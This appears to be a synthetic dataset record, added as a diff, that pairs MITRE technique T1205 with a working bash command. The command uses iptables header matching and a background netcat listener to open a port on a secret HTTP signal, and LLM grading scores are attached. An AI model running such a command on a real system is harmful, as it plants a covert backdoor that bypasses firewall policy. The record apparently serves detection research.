@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "iptables -I INPUT -m recent --name t1205_http --rcheck --seconds 60 -p tcp --dport 4444 -j ACCEPT; iptables -I INPUT -p tcp --dport 80 -m string --string \"X-T1205: OPEN\" --algo bm -m recent --name t1205_http --set -j LOG --log-prefix \"T1205-HTTP-SIGNAL \"; nc -l -p 4444 -k >/dev/null 2>&1 &",
+  "explanation": "Sets a signaling rule that watches for a crafted HTTP header (X-T1205: OPEN) on port 80, logs it, and whitelists the source via iptables recent. If seen, inbound TCP/4444 is allowed for 60s where nc listens. For lab use to simulate HTTP-based traffic signaling and detection.",
+  "rationale_steps": [
+    "Monitor application-layer HTTP header to set a temporary allow-list on match",
+    "Log abnormal HTTP packet content for detection and auditing",
+    "Expose a gated listener only when the signal is observed"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-19973fec-adac09f1",
+  "source_prompt_hash": "19973fec",
+  "timestamp_utc": "2025-09-30T03:30:48.198488Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are well-formed with proper separators, balanced quoting, and valid option structures for iptables and nc.",
+        "semantic_score": 4,
+        "semantic_justification": "It correctly uses an HTTP header match to set a recent list and temporarily allow TCP/4444 where nc listens, but it requires root privileges and specific kernel/modules/netcat variant support to function as described.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T17:09:59.370416Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with properly balanced quotes, valid iptables flags and modules (recent, string, algo), correct semicolons as separators, and valid nc syntax with background execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1205 traffic signaling by using iptables string matching to detect a crafted HTTP header (X-T1205: OPEN) on port 80, using the 'recent' module to whitelist the source IP for 60 seconds, and opening a backdoor listener on port 4444 — precisely modeling port-knock/signal-based C2 channel activation.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T03:59:01.651175Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command sequence is well-formed, uses correct iptables module syntax (recent and string), properly manages shell backgrounding, and uses valid command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly illustrates T1205 by using a specific HTTP header string as a signal to dynamically modify firewall rules (via the iptables 'recent' module) to allow access to a secondary service.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T03:59:14.170896Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
